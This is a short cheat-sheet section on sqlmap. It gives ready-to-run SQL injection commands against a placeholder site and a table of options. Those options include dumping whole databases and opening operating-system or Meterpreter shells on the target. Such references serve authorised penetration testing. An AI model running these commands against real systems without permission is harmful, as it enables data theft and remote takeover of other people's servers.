### sqlmap

Inject SQL code into request parameters:

```fundamental

sqlmap -a -u somesite.com/index.php?username=test&password=test

sqlmap -a -u somesite.com/index.php --data username=test&password=test

sqlmap -a -u somesite.com/index.php --data username=test&password=test -p password

```

| Option | Description |

| --- | --- |

| -u | Target URL |

| -H | Extra HTTP header |

| --data | Data string to be sent through POST |

| --cookie | HTTP Cookie header value |

| --proxy | Use a proxy to connect to the target URL (\[protocol://\]host\[:port\]) |

| -p | Testable parameter(s) |

| --level | Level of tests to perform (1-5, default: 1) |

| --risk | Risk of tests to perform (1-3, default: 1) |

| -a | Retrieve everything |

| -b | Retrieve DBMS banner |

| --dump-all | Dump all DBMS databases tables entries |

| --os-shell | Prompt for an interactive operating system shell |

| --os-pwn | Prompt for an OOB shell, Meterpreter, or VNC |

| --sqlmap-shell | Prompt for an interactive sqlmap shell |

| --wizard | Simple wizard interface for beginner users |